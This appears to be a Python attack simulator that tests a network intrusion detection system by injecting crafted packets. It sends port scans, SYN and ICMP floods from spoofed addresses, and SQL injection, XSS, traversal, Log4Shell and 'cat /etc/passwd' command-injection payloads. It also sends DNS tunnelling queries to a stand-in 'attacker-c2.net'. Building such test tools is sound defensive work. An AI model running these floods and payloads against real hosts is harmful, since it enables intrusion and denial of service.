#!/usr/bin/env python3
"""Live attack simulator for validating the NIDS on a real capture path.

Injects crafted packets with scapy so a running engine (``--interface`` or
``--replay-live``) can be observed firing alerts in real time.

* Requires Npcap on Windows (plus an elevated shell for best results).
* All attacks are lab-only and target whatever you pass via ``--target``
  (default 127.0.0.1). Use exclusively on networks you own.
"""

from __future__ import annotations

import argparse
import random
import sys
import time
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

try:
    from scapy.all import DNS, DNSQR, Ether, ICMP, IP, Raw, TCP, UDP, send, sendp
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

from tools.generate_demo_pcap import _payloads  # reuse identical fixtures  # noqa: E402

ATTACKER_IP = "10.9.9.66"
SECONDARY_IP = "10.9.9.77"


def _check_scapy() -> None:
    if not SCAPY_OK:
        print("[!] scapy is required: pip install scapy (and Npcap on Windows)")
        sys.exit(1)


def attack_port_scan(target: str, duration: float = 6.0) -> None:
    print(f"[*] TCP SYN scan against {target} (22 common ports)")
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 1433,
             3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200]
    for i, port in enumerate(ports):
        send(IP(src=ATTACKER_IP, dst=target) / TCP(sport=50000 + i, dport=port,
                                                   flags="S", seq=i), verbose=0)
        time.sleep(duration / len(ports))


def attack_ssh_bruteforce(target: str, count: int = 30) -> None:
    print(f"[*] SSH brute force: {count} attempts against {target}:22")
    for i in range(count):
        send(IP(src=ATTACKER_IP, dst=target)
             / TCP(sport=51000 + i, dport=22, flags="S", seq=i), verbose=0)
        time.sleep(0.15)


def attack_dos(target: str, count: int = 300) -> None:
    print(f"[*] SYN flood: {count} packets against {target}:80")
    for i in range(count):
        send(IP(src=SECONDARY_IP, dst=target)
             / TCP(sport=54000 + (i % 20000), dport=80, flags="S", seq=i), verbose=0)
        time.sleep(0.008)


def attack_web(target: str, dport: int = 80) -> None:
    print(f"[*] Web attack payloads against {target}:{dport}")
    pay = _payloads()
    requests = [
        f"GET {pay['sqli_tautology']} HTTP/1.1\r\nHost: target\r\n\r\n",
        f"GET {pay['sqli_union']} HTTP/1.1\r\nHost: target\r\n\r\n",
        f"GET {pay['xss']} HTTP/1.1\r\nHost: target\r\n\r\n",
        f"GET {pay['traversal']} HTTP/1.1\r\nHost: target\r\n\r\n",
        f"POST /api/config HTTP/1.1\r\nHost: target\r\nContent-Length: 19\r\n\r\ncmd=cat /etc/passwd",
        f"GET /index.jsp HTTP/1.1\r\nHost: target\r\nUser-Agent: {pay['log4shell']}\r\n\r\n",
    ]
    for i, req in enumerate(requests):
        send(IP(src=ATTACKER_IP, dst=target)
             / TCP(sport=56000 + i, dport=dport, flags="PA", seq=i, ack=1)
             / Raw(req.encode()), verbose=0)
        time.sleep(0.4)


def attack_dns_tunnel(target: str, dns_server: str = "8.8.8.8") -> None:
    print(f"[*] DNS tunnelling simulation towards {dns_server}")
    rng = random.Random(99)
    for i in range(45):
        label = "".join(rng.choice("0123456789abcdef") for _ in range(40))
        send(IP(src=ATTACKER_IP, dst=dns_server) / UDP(sport=57000 + i, dport=53)
             / DNS(rd=1, qd=DNSQR(qname=f"{label}.tunnel.attacker-c2.net",
                                   qtype="TXT")), verbose=0)
        time.sleep(0.12)


def attack_icmp_flood(target: str, count: int = 150) -> None:
    print(f"[*] ICMP echo flood: {count} packets against {target}")
    for i in range(count):
        send(IP(src=SECONDARY_IP, dst=target) / ICMP(type=8, id=666, seq=i)
             / Raw(b"flood"), verbose=0)
        time.sleep(0.01)


ATTACKS = {
    "scan": attack_port_scan,
    "bruteforce": attack_ssh_bruteforce,
    "dos": attack_dos,
    "web": attack_web,
    "dnstunnel": attack_dns_tunnel,
    "icmpflood": attack_icmp_flood,
}


def run_all_attacks(target: str = "127.0.0.1", only: str | None = None) -> None:
    _check_scapy()
    names = list(ATTACKS) if not only else [only]
    print("=" * 60)
    print(" ATTACK SIMULATION - lab use only, target:", target)
    print("=" * 60)
    for name in names:
        if name not in ATTACKS:
            print(f"[!] unknown attack '{name}' - choose from {', '.join(ATTACKS)}")
            continue
        ATTACKS[name](target)
        time.sleep(1.0)
    print("[*] Simulation complete - check the engine console and dashboard.")


def main() -> None:
    parser = argparse.ArgumentParser(description="NIDS attack simulator (lab use)")
    parser.add_argument("--target", default="127.0.0.1", help="attack target IP")
    parser.add_argument("--attack", choices=sorted(ATTACKS) + ["all"], default="all")
    args = parser.parse_args()
    run_all_attacks(target=args.target,
                    only=None if args.attack == "all" else args.attack)


if __name__ == "__main__":
    main()
